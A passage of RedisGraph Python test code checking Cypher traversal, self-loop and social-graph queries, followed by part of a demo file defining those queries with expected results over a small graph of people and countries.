        for idx, v in enumerate(node_props):
            node = Node(label=""L"", properties={""val"": v})
            nodes.append(node)
            redis_graph.add_node(node)

        edge = Edge(nodes[0], ""e"", nodes[1])
        redis_graph.add_edge(edge)

        edge = Edge(nodes[1], ""e"", nodes[2])
        redis_graph.add_edge(edge)

        redis_graph.commit()

    # Test patterns that traverse 1 edge.
    def test01_one_hop_traversals(self):
        # Conditional traversal with label
        query = """"""MATCH (a)-[:e]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        result_a = redis_graph.query(query)

        # Conditional traversal without label
        query = """"""MATCH (a)-[]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        result_b = redis_graph.query(query)

        # Fixed-length 1-hop traversal with label
        query = """"""MATCH (a)-[:e*1]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        result_c = redis_graph.query(query)

        # Fixed-length 1-hop traversal without label
        query = """"""MATCH (a)-[*1]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        result_d = redis_graph.query(query)

        assert(result_b.result_set == result_a.result_set)
        assert(result_c.result_set == result_a.result_set)
        assert(result_d.result_set == result_a.result_set)

    # Test patterns that traverse 2 edges.
    def test02_two_hop_traversals(self):
        # Conditional two-hop traversal without referenced intermediate node
        query = """"""MATCH (a)-[:e]->()-[:e]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v1', 'v3']]
        assert(actual_result.result_set == expected_result)

        # Fixed-length two-hop traversal (same expected result)
        query = """"""MATCH (a)-[:e*2]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        assert(actual_result.result_set == expected_result)

        # Variable-length traversal with a minimum bound of 2 (same expected result)
        query = """"""MATCH (a)-[*2..]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        assert(actual_result.result_set == expected_result)

        # Conditional two-hop traversal with referenced intermediate node
        query = """"""MATCH (a)-[:e]->(b)-[:e]->(c) RETURN a.val, b.val, c.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v1', 'v2', 'v3']]
        assert(actual_result.result_set == expected_result)

    # Test variable-length patterns
    def test03_var_len_traversals(self):
        # Variable-length traversal with label
        query = """"""MATCH (a)-[:e*]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v1', 'v2'],
                           ['v1', 'v3'],
                           ['v2', 'v3']]
        assert(actual_result.result_set == expected_result)

        # Variable-length traversal without label (same expected result)
        query = """"""MATCH (a)-[*]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        assert(actual_result.result_set == expected_result)

        # Variable-length traversal with bounds 1..2 (same expected result)
        query = """"""MATCH (a)-[:e*1..2]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        assert(actual_result.result_set == expected_result)

        # Variable-length traversal with bounds 0..1
        # This will return every node and itself, as well as all
        # single-hop edges.
        query = """"""MATCH (a)-[:e*0..1]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v1', 'v1'],
                           ['v1', 'v2'],
                           ['v2', 'v2'],
                           ['v2', 'v3'],
                           ['v3', 'v3']]
        assert(actual_result.result_set == expected_result)

    # Test variable-length patterns with alternately labeled source
    # and destination nodes, which can cause different execution sequences.
    def test04_variable_length_labeled_nodes(self):
        # Source and edge labeled variable-length traversal
        query = """"""MATCH (a:L)-[:e*]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v1', 'v2'],
                           ['v1', 'v3'],
                           ['v2', 'v3']]
        assert(actual_result.result_set == expected_result)

        # Destination and edge labeled variable-length traversal (same expected result)
        query = """"""MATCH (a)-[:e*]->(b:L) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        assert(actual_result.result_set == expected_result)

        # Source labeled variable-length traversal (same expected result)
        query = """"""MATCH (a:L)-[*]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        assert(actual_result.result_set == expected_result)

        # Destination labeled variable-length traversal (same expected result)
        query = """"""MATCH (a)-[*]->(b:L) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        assert(actual_result.result_set == expected_result)

    # Test traversals over explicit relationship types
    def test05_relation_types(self):
        # Add two nodes and two edges of a new type.
        # The new form of the graph will be:
        # (v1)-[:e]->(v2)-[:e]->(v3)-[:q]->(v4)-[:q]->(v5)
        query = """"""MATCH (n {val: 'v3'}) CREATE (n)-[:q]->(:L {val: 'v4'})-[:q]->(:L {val: 'v5'})""""""
        actual_result = redis_graph.query(query)
        assert(actual_result.nodes_created == 2)
        assert(actual_result.relationships_created == 2)

        # Verify the graph structure
        query = """"""MATCH (a)-[e]->(b) RETURN a.val, b.val, TYPE(e) ORDER BY TYPE(e), a.val, b.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v1', 'v2', 'e'],
                           ['v2', 'v3', 'e'],
                           ['v3', 'v4', 'q'],
                           ['v4', 'v5', 'q']]
        assert(actual_result.result_set == expected_result)

        # Verify conditional traversals with explicit relation types
        query = """"""MATCH (a)-[:e]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v1', 'v2'],
                           ['v2', 'v3']]
        assert(actual_result.result_set == expected_result)

        query = """"""MATCH (a)-[:q]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v3', 'v4'],
                           ['v4', 'v5']]
        assert(actual_result.result_set == expected_result)

        # Verify conditional traversals with multiple explicit relation types
        query = """"""MATCH (a)-[e:e|:q]->(b) RETURN a.val, b.val, TYPE(e) ORDER BY TYPE(e), a.val, b.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v1', 'v2', 'e'],
                           ['v2', 'v3', 'e'],
                           ['v3', 'v4', 'q'],
                           ['v4', 'v5', 'q']]
        assert(actual_result.result_set == expected_result)

        # Verify variable-length traversals with explicit relation types
        query = """"""MATCH (a)-[:e*]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v1', 'v2'],
                           ['v1', 'v3'],
                           ['v2', 'v3']]
        assert(actual_result.result_set == expected_result)

        query = """"""MATCH (a)-[:q*]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v3', 'v4'],
                           ['v3', 'v5'],
                           ['v4', 'v5']]
        assert(actual_result.result_set == expected_result)

        # Verify variable-length traversals with multiple explicit relation types
        query = """"""MATCH (a)-[:e|:q*]->(b) RETURN a.val, b.val ORDER BY a.val, b.val""""""
        actual_result = redis_graph.query(query)
        expected_result = [['v1', 'v2'],
                           ['v1', 'v3'],
                           ['v1', 'v4'],
                           ['v1', 'v5'],
                           ['v2', 'v3'],
                           ['v2', 'v4'],
                           ['v2', 'v5'],
                           ['v3', 'v4'],
                           ['v3', 'v5'],
                           ['v4', 'v5']]
        assert(actual_result.result_set == expected_result)

/n/n/ntests/flow/test_self_pointing_node.py/n/nimport os
import sys
import unittest
from redisgraph import Graph, Node, Edge

# import redis
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from disposableredis import DisposableRedis

from base import FlowTestsBase

redis_graph = None

GRAPH_ID = ""G""

def redis():
    return DisposableRedis(loadmodule=os.path.dirname(os.path.abspath(__file__)) + '/../../src/redisgraph.so')

class SelfPointingNode(FlowTestsBase):
    @classmethod
    def setUpClass(cls):
        print ""SelfPointingNode""
        global redis_graph
        cls.r = redis()
        cls.r.start()
        redis_con = cls.r.client()
        redis_graph = Graph(GRAPH_ID, redis_con)

        cls.populate_graph()

    @classmethod
    def tearDownClass(cls):
        cls.r.stop()
        # pass

    @classmethod
    def populate_graph(cls):
        # Construct a graph with the form:
        # (v1)-[:e]->(v1)

        node = Node(label=""L"")
        redis_graph.add_node(node)

        edge = Edge(node, ""e"", node)
        redis_graph.add_edge(edge)

        redis_graph.commit()

    # Test patterns that traverse 1 edge.
    def test_self_pointing_node(self):
        # Conditional traversal with label
        query = """"""MATCH (a)-[:e]->(a) RETURN a""""""
        result_a = redis_graph.query(query)
        plan_a = redis_graph.execution_plan(query)

        query = """"""MATCH (a:L)-[:e]->(a) RETURN a""""""
        result_b = redis_graph.query(query)
        plan_b = redis_graph.execution_plan(query)

        query = """"""MATCH (a)-[:e]->(a:L) RETURN a""""""
        result_c = redis_graph.query(query)
        plan_c = redis_graph.execution_plan(query)

        query = """"""MATCH (a)-[]->(a) RETURN a""""""
        result_d = redis_graph.query(query)
        plan_d = redis_graph.execution_plan(query)

        query = """"""MATCH (a:L)-[]->(a) RETURN a""""""
        result_e = redis_graph.query(query)
        plan_e = redis_graph.execution_plan(query)

        query = """"""MATCH (a)-[]->(a:L) RETURN a""""""
        result_f = redis_graph.query(query)
        plan_f = redis_graph.execution_plan(query)

        assert(len(result_a.result_set) == 1)
        n = result_a.result_set[0][0]
        assert(n.id == 0)

        assert(result_b.result_set == result_a.result_set)
        assert(result_c.result_set == result_a.result_set)
        assert(result_d.result_set == result_a.result_set)
        assert(result_e.result_set == result_a.result_set)
        assert(result_f.result_set == result_a.result_set)

        assert(""Expand Into"" in plan_a)
        assert(""Expand Into"" in plan_b)
        assert(""Expand Into"" in plan_c)
        assert(""Expand Into"" in plan_d)
        assert(""Expand Into"" in plan_e)
        assert(""Expand Into"" in plan_f)
/n/n/ntests/flow/test_social.py/n/nimport os
import sys
import unittest
from redisgraph import Graph

sys.path.append(os.path.dirname(os.path.abspath(__file__)) + '/../../demo/social/')

# import redis
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from disposableredis import DisposableRedis

from .reversepattern import ReversePattern
from base import FlowTestsBase
import social_queries as queries
import social_utils

redis_graph = None

def redis():
    return DisposableRedis(loadmodule=os.path.dirname(os.path.abspath(__file__)) + '/../../src/redisgraph.so')

class SocialFlowTest(FlowTestsBase):
    @classmethod
    def setUpClass(cls):
        print ""SocialFlowTest""
        global redis_graph

        cls.r = redis()
        cls.r.start()
        redis_con = cls.r.client()
        redis_graph = Graph(social_utils.graph_name, redis_con)
        social_utils.populate_graph(redis_con, redis_graph)

        # cls.r = redis.Redis()
        # redis_graph = Graph(social_utils.graph_name, cls.r)
        # social_utils.populate_graph(cls.r, redis_graph)

    @classmethod
    def tearDownClass(cls):
        cls.r.stop()
        # pass

    def assert_reversed_pattern(self, query, resultset):
        # Test reversed pattern query.
        reversed_query = ReversePattern().reverse_query_pattern(query)
        # print ""reversed_query: %s"" % reversed_query
        actual_result = redis_graph.query(reversed_query)

        # assert result set
        self.assertEqual(resultset.result_set, actual_result.result_set)

        # assert query run time
        self._assert_equalish(resultset.run_time_ms, actual_result.run_time_ms)
        
    def test00_graph_entities(self):
        global redis_graph
        q = queries.graph_entities.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.graph_entities)

        # assert query run time
        self._assert_run_time(actual_result, queries.graph_entities)
        
        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test01_relation_type_strings(self):
        global redis_graph
        q = queries.relation_type_counts.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.relation_type_counts)

        # assert query run time
        self._assert_run_time(actual_result, queries.relation_type_counts)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test02_subset_of_people(self):
        global redis_graph
        q = queries.subset_of_people.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.subset_of_people)

        # assert query run time
        self._assert_run_time(actual_result, queries.subset_of_people)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test03_my_friends(self):
        global redis_graph
        q = queries.my_friends_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.my_friends_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.my_friends_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test04_friends_of_friends(self):
        global redis_graph
        q = queries.friends_of_friends_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.friends_of_friends_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.friends_of_friends_query)
        runtime = actual_result.run_time_ms

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test05_friends_of_friends_single_and_over_30(self):
        global redis_graph
        q = queries.friends_of_friends_single_and_over_30_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.friends_of_friends_single_and_over_30_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.friends_of_friends_single_and_over_30_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test06_friends_of_friends_visited_netherlands_and_single(self):
        global redis_graph
        q = queries.friends_of_friends_visited_netherlands_and_single_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.friends_of_friends_visited_netherlands_and_single_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.friends_of_friends_visited_netherlands_and_single_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test07_friends_visited_same_places_as_me(self):
        global redis_graph
        q = queries.friends_visited_same_places_as_me_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.friends_visited_same_places_as_me_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.friends_visited_same_places_as_me_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test08_countries_visited_by_roi_tal_boaz(self):
        global redis_graph
        q = queries.countries_visited_by_roi_tal_boaz.query
        actual_result = redis_graph.query(q)
        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.countries_visited_by_roi_tal_boaz)

        # assert query run time
        self._assert_run_time(actual_result, queries.countries_visited_by_roi_tal_boaz)
        
    def test09_friends_older_than_me(self):
        global redis_graph
        q = queries.friends_older_than_me_query.query
        actual_result = redis_graph.query(q)

        # assert result set        
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.friends_older_than_me_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.friends_older_than_me_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test10_friends_age_difference_query(self):
        global redis_graph
        q = queries.friends_age_difference_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.friends_age_difference_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.friends_age_difference_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test11_friends_who_are_older_than_average(self):
        global redis_graph
        q = queries.friends_who_are_older_than_average.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.friends_who_are_older_than_average)

        # assert query run time
        self._assert_run_time(actual_result, queries.friends_who_are_older_than_average)

    def test12_how_many_countries_each_friend_visited(self):
        global redis_graph
        q = queries.how_many_countries_each_friend_visited_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.how_many_countries_each_friend_visited_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.how_many_countries_each_friend_visited_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test13_visit_purpose_of_each_country_i_visited(self):
        global redis_graph
        q = queries.visit_purpose_of_each_country_i_visited_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.visit_purpose_of_each_country_i_visited_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.visit_purpose_of_each_country_i_visited_query)
        
        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test14_who_was_on_business_trip(self):
        global redis_graph
        q = queries.who_was_on_business_trip_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.who_was_on_business_trip_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.who_was_on_business_trip_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test15_number_of_vacations_per_person(self):
        global redis_graph
        NUM_EXPECTED_RESULTS = 6

        q = queries.number_of_vacations_per_person_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_actual_results_contained_in_expected_results(
            actual_result,
            queries.number_of_vacations_per_person_query,
            NUM_EXPECTED_RESULTS)

        # assert query run time
        self._assert_run_time(actual_result, queries.number_of_vacations_per_person_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test16_all_reachable_friends_query(self):
        global redis_graph

        q = queries.all_reachable_friends_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.all_reachable_friends_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.all_reachable_friends_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)
    
    def test17_all_reachable_countries_query(self):
        global redis_graph

        q = queries.all_reachable_countries_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.all_reachable_countries_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.all_reachable_countries_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test18_reachable_countries_or_people_query(self):
        global redis_graph

        q = queries.reachable_countries_or_people_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.reachable_countries_or_people_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.reachable_countries_or_people_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test19_all_reachable_countries_or_people_query(self):
        global redis_graph

        q = queries.all_reachable_countries_or_people_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.all_reachable_countries_or_people_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.all_reachable_countries_or_people_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test20_all_reachable_entities_query(self):
        global redis_graph

        q = queries.all_reachable_entities_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.all_reachable_entities_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.all_reachable_entities_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)
    
    def test21_all_reachable_people_min_2_hops_query(self):
        global redis_graph

        q = queries.all_reachable_people_min_2_hops_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.all_reachable_people_min_2_hops_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.all_reachable_people_min_2_hops_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test22_happy_birthday(self):
        global redis_graph
        q = queries.happy_birthday_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.happy_birthday_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.happy_birthday_query)

    def test23_friends_age_statistics(self):
        global redis_graph
        q = queries.friends_age_statistics_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.friends_age_statistics_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.friends_age_statistics_query)
        
        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)
    
    def test24_all_paths_leads_to_greece_query(self):
        global redis_graph
        q = queries.all_paths_leads_to_greece_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.all_paths_leads_to_greece_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.all_paths_leads_to_greece_query)
        
        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test25_number_of_paths_to_places_visited(self):
        global redis_graph
        q = queries.number_of_paths_to_places_visited.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.number_of_paths_to_places_visited)

        # assert query run time
        self._assert_run_time(actual_result, queries.number_of_paths_to_places_visited)

    def test26_delete_friendships(self):
        global redis_graph
        q = queries.delete_friendships_query.query
        actual_result = redis_graph.query(q)

        # assert query run time
        self._assert_run_time(actual_result, queries.delete_friendships_query)

    def test27_delete_person(self):
        global redis_graph
        q = queries.delete_person_query.query
        actual_result = redis_graph.query(q)

        # assert query run time
        self._assert_run_time(actual_result, queries.delete_person_query)

    def test28_post_delete_label(self):
        global redis_graph
        q = queries.post_delete_label_query.query
        actual_result = redis_graph.query(q)

         # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.post_delete_label_query)
        # assert query run time
        self._assert_run_time(actual_result, queries.post_delete_label_query)

if __name__ == '__main__':
    unittest.main()
/n/n/n",0
61,19ef952f804b536777040d963e1dd828091f7ca5,"/demo/social/social_queries.py/n/nimport sys
import os

sys.path.append(os.path.dirname(os.path.abspath(__file__)) + '/../../')
from demo import QueryInfo

graph_entities = QueryInfo(
    query=""""""MATCH (e) RETURN e.name, LABELS(e) as label ORDER BY label, e.name"""""",
    description='Returns each node in the graph, specifing node label.',
    max_run_time_ms=0.2,
    expected_result=[['Netherlands','country'],
                     ['Andora','country'],
                     ['Canada','country'],
                     ['China','country'],
                     ['Germany','country'],
                     ['Greece','country'],
                     ['Italy','country'],
                     ['Japan','country'],
                     ['Kazakhstan','country'],
                     ['Prague','country'],
                     ['Russia','country'],
                     ['Thailand','country'],
                     ['USA','country'],
                     ['Ailon Velger','person'],
                     ['Alon Fital','person'],
                     ['Boaz Arad','person'],
                     ['Gal Derriere','person'],
                     ['Jane Chernomorin','person'],
                     ['Lucy Yanfital','person'],
                     ['Mor Yesharim','person'],
                     ['Noam Nativ','person'],
                     ['Omri Traub','person'],
                     ['Ori Laslo','person'],
                     ['Roi Lipman','person'],
                     ['Shelly Laslo Rooz','person'],
                     ['Tal Doron','person'],
                     ['Valerie Abigail Arad','person']]
)

relation_type_counts = QueryInfo(
    query=""""""MATCH ()-[e]->() RETURN TYPE(e) as relation_type, COUNT(e) as num_relations ORDER BY relation_type, num_relations"""""",
    description='Returns each relation type in the graph and its count.',
    max_run_time_ms=0.4,
    expected_result=[['friend', 13],
                     ['visited', 43]]
)

subset_of_people = QueryInfo(
    query=""""""MATCH (p:person) RETURN p.name ORDER BY p.name SKIP 3 LIMIT 5"""""",
    description='Get a subset of people.',
    max_run_time_ms=0.2,
    expected_result=[[""Gal Derriere""],
                    [""Jane Chernomorin""],
                    [""Lucy Yanfital""],
                    [""Mor Yesharim""],
                    [""Noam Nativ""]]
)

my_friends_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(f:person) 
             RETURN f.name"""""",
    description='My friends?',
    max_run_time_ms=0.2,
    expected_result=[['Tal Doron'],
                     ['Omri Traub'],
                     ['Boaz Arad'],
                     ['Ori Laslo'],
                     ['Ailon Velger'],
                     ['Alon Fital']]
)

friends_of_friends_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(:person)-[:friend]->(fof:person) 
             RETURN fof.name"""""",
    description='Friends of friends?',
    max_run_time_ms=0.2,
    expected_result=[['Valerie Abigail Arad'],
                     ['Shelly Laslo Rooz'],
                     ['Noam Nativ'],
                     ['Jane Chernomorin'],
                     ['Mor Yesharim'],
                     ['Gal Derriere'],
                     ['Lucy Yanfital']]
)

friends_of_friends_single_and_over_30_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(:person)-[:friend]->(fof:person {status:""single""})
             WHERE fof.age > 30
             RETURN fof.name, fof.age, fof.gender, fof.status"""""",
    description='Friends of friends who are single and over 30?',
    max_run_time_ms=0.25,
    expected_result=[['Noam Nativ', 34, 'male', 'single']]
)

friends_of_friends_visited_netherlands_and_single_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(:person)-[:friend]->
             (fof:person {status:""single""})-[:visited]->(:country {name:""Netherlands""})
             RETURN fof.name"""""",
    description='Friends of friends who visited Netherlands and are single?',
    max_run_time_ms=0.3,
    expected_result=[['Noam Nativ'],
                     ['Gal Derriere']]
)

friends_visited_same_places_as_me_query = QueryInfo(
    query=""""""MATCH (:person {name:""Roi Lipman""})-[:visited]->(c:country)<-[:visited]-(f:person)<-
             [:friend]-(:person {name:""Roi Lipman""}) 
             RETURN f.name, c.name"""""",
    description='Friends who have been to places I have visited?',
    max_run_time_ms=0.45,
    expected_result=[['Tal Doron', 'Japan'],
                     ['Alon Fital', 'Prague'],
                     ['Tal Doron', 'USA'],
                     ['Omri Traub', 'USA'],
                     ['Boaz Arad', 'USA'],
                     ['Ori Laslo', 'USA'],
                     ['Alon Fital', 'USA']]
)

friends_older_than_me_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(f:person)
             WHERE f.age > ME.age
             RETURN f.name, f.age"""""",
    description='Friends who are older than me?',
    max_run_time_ms=0.25,
    expected_result=[['Omri Traub', 33]]
)

friends_age_difference_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(f:person)
             RETURN f.name, abs(ME.age - f.age) AS age_diff
             ORDER BY age_diff desc"""""",
    description='Age difference between me and each of my friends.',
    max_run_time_ms=0.35,
    expected_result=[['Boaz Arad', 1],
                     ['Omri Traub', 1],
                     ['Ailon Velger', 0],
                     ['Tal Doron', 0],
                     ['Ori Laslo', 0],
                     ['Alon Fital', 0]]
)

friends_who_are_older_than_average = QueryInfo(
    query=""""""MATCH (p:person)
             WITH avg(p.age) AS average_age 
             MATCH(:person)-[:friend]->(f:person) 
             WHERE f.age > average_age 
             RETURN f.name, f.age, round(f.age - average_age) AS age_diff 
             ORDER BY age_diff, f.name DESC
             LIMIT 4"""""",
    description='Friends who are older then the average age.',
    max_run_time_ms=0.35,
    expected_result=[['Noam Nativ', 34, 3.0],
                     ['Omri Traub', 33, 2.0],
                     ['Tal Doron', 32, 1.0],
                     ['Ori Laslo', 32, 1.0]]
)

how_many_countries_each_friend_visited_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(friend:person)-[:visited]->(c:country)
             RETURN friend.name, count(c.name) AS countriesVisited
             ORDER BY countriesVisited DESC
             LIMIT 10"""""",
    description='Count for each friend how many countires he or she been to?',
    max_run_time_ms=0.3,
    expected_result=[['Alon Fital', 3],
                     ['Omri Traub', 3],
                     ['Tal Doron', 3],
                     ['Ori Laslo', 3],
                     ['Boaz Arad', 2]]
)

happy_birthday_query = QueryInfo(
    query = """"""MATCH (:person {name:""Roi Lipman""})-[:friend]->(f:person)
               SET f.age = f.age + 1
               RETURN f.name, f.age order by f.name, f.age"""""",
    description='Update friends age.',
    max_run_time_ms=0.25,
    expected_result=[['Ailon Velger', 33],
                     ['Alon Fital',   33],
                     ['Boaz Arad',    32],
                     ['Omri Traub',   34],
                     ['Ori Laslo',    33],
                     ['Tal Doron',    33]]
)

friends_age_statistics_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(f:person)
             RETURN ME.name, count(f.name), sum(f.age), avg(f.age), min(f.age), max(f.age)"""""",
    description='Friends age statistics.',
    max_run_time_ms=0.2,
    expected_result=[['Roi Lipman', 6, 198.0, 33.0, 32, 34]]
)

visit_purpose_of_each_country_i_visited_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[v:visited]->(c:country) 
             RETURN c.name, v.purpose"""""",
    description='For each country i have been to, what was the visit purpose?',
    max_run_time_ms=0.2,
    expected_result=[['Japan', 'pleasure'],
                     ['Prague', 'pleasure'],
                     ['Prague', 'business'],
                     ['USA', 'business']]
)

who_was_on_business_trip_query = QueryInfo(
    query=""""""MATCH (p:person)-[v:visited {purpose:""business""}]->(c:country)
             RETURN p.name, v.purpose, toUpper(c.name)"""""",
    description='Find out who went on a business trip?',
    max_run_time_ms=0.3,
    expected_result=[['Boaz Arad', 'business','NETHERLANDS'],
                     ['Boaz Arad', 'business','USA'],
                     ['Ori Laslo', 'business', 'CHINA'],
                     ['Ori Laslo', 'business', 'USA'],
                     ['Jane Chernomorin', 'business', 'USA'],
                     ['Alon Fital', 'business', 'USA'],
                     ['Alon Fital', 'business', 'PRAGUE'],
                     ['Mor Yesharim', 'business', 'GERMANY'],
                     ['Gal Derriere', 'business', 'NETHERLANDS'],
                     ['Lucy Yanfital', 'business', 'USA'],
                     ['Roi Lipman', 'business', 'USA'],
                     ['Roi Lipman', 'business', 'PRAGUE'],
                     ['Tal Doron', 'business', 'USA'],
                     ['Tal Doron', 'business', 'JAPAN']]
)

number_of_vacations_per_person_query = QueryInfo(
    query=""""""MATCH (p:person)-[v:visited {purpose:""pleasure""}]->(c:country)
             RETURN p.name, count(v.purpose) AS vacations
             ORDER BY vacations DESC
             LIMIT 6"""""",
